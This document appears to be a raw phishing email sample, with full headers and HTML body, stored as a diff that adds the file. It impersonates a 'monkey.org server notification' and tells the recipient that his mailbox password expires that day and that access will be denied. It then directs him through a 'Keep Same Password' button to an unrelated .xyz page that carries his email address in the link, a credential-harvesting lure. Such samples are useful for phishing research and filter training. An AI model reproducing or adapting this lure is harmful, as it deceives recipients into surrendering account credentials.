@@ -1,0 +1,83 @@
+Return-Path: mujihotel@mh-beijing.com
+Delivered-To: jose@monkey.org
+X-FDA: 78847599516.02.DCFBAEE
+Received: from admin41.pegasus-idc.com (unknown [114.142.158.62])
+	by imf22.b.hostedemail.com (Postfix) with ESMTP id 9CB2C801BDF3
+	for <jose@monkey.org>; Thu, 25 Nov 2021 13:55:17 +0000 (UTC)
+Received: from mh-beijing.com (unknown [37.120.206.77])
+	(Authenticated sender: mujihotel@mh-beijing.com)
+	by admin41.pegasus-idc.com (Postfix) with ESMTPA id 19C2C1C780C
+	for <jose@monkey.org>; Thu, 25 Nov 2021 21:50:17 +0800 (HKT)
+DKIM-Filter: OpenDKIM Filter v2.9.2 admin41.pegasus-idc.com 19C2C1C780C
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=mh-beijing.com;
+	s=mail; t=1637848218;
+	bh=OIn8dcIP1QjjKD9ISN0jyzuqvzh9gnPQrAt9xhPaybE=;
+	h=From:To:Subject:Date:From;
+	b=bzQCtwr/J9WqBHB5rTeqInQEWV1dxP1ZvW8HbnchuVupLNUf16msbR9asabBqamPN
+	 swGDGZM2wrM9THTRknJNC4mQruDkLy8DMUVxYNuC9v32spvpc7us6jTkjfwn/3RZR1
+	 aAgIz154KzMOQku/0V2ojr13Sx6VrAFrI2e25z1XgFoiIcGOOif1NUtwjJNTcE7hxc
+	 KcrBZ0XuyXaqh12h6omecCMAxYFMm+6WDjRW/jSqFDT0doW9uMOXjomwCaR4rA+imX
+	 cPuf/+ZYWZzABRs1HNikjCA8n8e0QMY7+NAd9kIVJ32C/jOsAE9dBtKRHnhHZxdkvP
+	 GppYF3HrPCJzg==
+From: monkey.org  <mujihotel@mh-beijing.com>
+To: jose@monkey.org
+Subject: New mail from monkey.org sever
+Date: 25 Nov 2021 05:48:26 -0800
+Message-ID: <20211125054826.6D853867A450A58F@mh-beijing.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+Authentication-Results: imf22.b.hostedemail.com;
+	dkim=pass header.d=mh-beijing.com header.s=mail header.b="bzQCtwr/";
+	spf=pass (imf22.b.hostedemail.com: domain of mujihotel@mh-beijing.com designates 114.142.158.62 as permitted sender) smtp.mailfrom=mujihotel@mh-beijing.com;
+	dmarc=none
+X-Spam-Status: No, score=6.33
+X-Rspamd-Server: rspam08
+X-Rspamd-Queue-Id: 9CB2C801BDF3
+X-Stat-Signature: 6g8uqa4r1cyiu7ya47mwnkypphuofbsh
+X-HE-Tag: 1637848517-203801
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 93
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.20139"></HEAD>
+<body><SMALL><BR style=3D"FONT-SIZE: medium; FONT-FAMILY: Segoe UI; WHITE-S=
+PACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; CO=
+LOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING:=
+ normal; BACKGROUND-COLOR: rgb(224,230,248); TEXT-INDENT: 0px"></SMALL>
+<DIV class=3Dx_bigbox style=3D"FONT-SIZE: medium; FONT-FAMILY: Segoe UI; WI=
+DTH: 652px; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; F=
+ONT-WEIGHT: 400; COLOR: rgb(0,0,0); PADDING-BOTTOM: 20px; FONT-STYLE: norma=
+l; PADDING-TOP: 20px; PADDING-LEFT: 20px; ORPHANS: 2; WIDOWS: 2; LETTER-SPA=
+CING: normal; PADDING-RIGHT: 20px; BACKGROUND-COLOR: rgb(235,235,235); TEXT=
+-INDENT: 0px"><SMALL><B style=3D"FONT-SIZE: 30px; COLOR: rgb(0,117,191)">mo=
+nkey.org server notification</B><BR><BR></SMALL>
+<DIV class=3Dx_smallbox style=3D"BORDER-TOP: rgb(255,255,255) 1px solid; BO=
+RDER-RIGHT: rgb(255,255,255) 1px solid; BACKGROUND: rgb(255,255,255) 0% 50%=
+; BORDER-BOTTOM: rgb(255,255,255) 1px solid; PADDING-BOTTOM: 10px; PADDING-=
+TOP: 10px; PADDING-LEFT: 10px; BORDER-LEFT: rgb(255,255,255) 1px solid; PAD=
+DING-RIGHT: 10px; border-image: none; -moz-background-clip: initial; -moz-b=
+ackground-origin: initial; -moz-background-inline-policy: initial">
+<H3><BIG><FONT color=3D#5b7ca4 size=3D6>Email Update</FONT></BIG></H3><B></=
+B><FONT size=3D2>Dear jose ,</FONT><SMALL><BIG><BR><FONT size=3D2><BR>The p=
+assword to your email <SPAN style=3D"TEXT-DECORATION: underline; COLOR: rgb=
+(51,51,255)"><STRONG>jose@monkey.org</STRONG></SPAN> is expiring on <STRONG=
+>11/25/2021 5:48:26 a.m.</STRONG><BR>You are required to use below to keep =
+same password otherwise access to your mailbox will be denied.<BR></FONT></=
+BIG><BR></SMALL>
+<P style=3D"FONT-SIZE: 15px; BORDER-TOP-COLOR: rgb(0,117,191); WIDTH: 350px=
+; BORDER-LEFT-COLOR: rgb(0,117,191); FONT-WEIGHT: bolder; COLOR: rgb(255,25=
+5,255); PADDING-BOTTOM: 10px; BORDER-BOTTOM-COLOR: rgb(0,117,191); TEXT-ALI=
+GN: center; PADDING-TOP: 10px; PADDING-LEFT: 10px; MARGIN: 0px auto; BORDER=
+-RIGHT-COLOR: rgb(0,117,191); PADDING-RIGHT: 10px; BACKGROUND-COLOR: rgb(0,=
+117,191)"><B><SMALL><A href=3D"https://servsooplc.xyz/wwb1/testlab.php?emai=
+l=3Djose@monkey.org">Keep Same Password</A></SMALL></B></P>
+<B><SMALL><SMALL style=3D"COLOR: rgb(153,153,153)"><BR>Connected to&nbsp;mo=
+nkey.org Mail Server&nbsp;&nbsp;<BR>&copy; 2020 monkey.org Corporation. All=
+ rights reserved. </SMALL></SMALL></B></DIV></DIV><B><SMALL><BR class=3DApp=
+le-interchange-newline style=3D"FONT-FAMILY: Segoe UI"></SMALL></B></BODY><=
+/HTML>
+
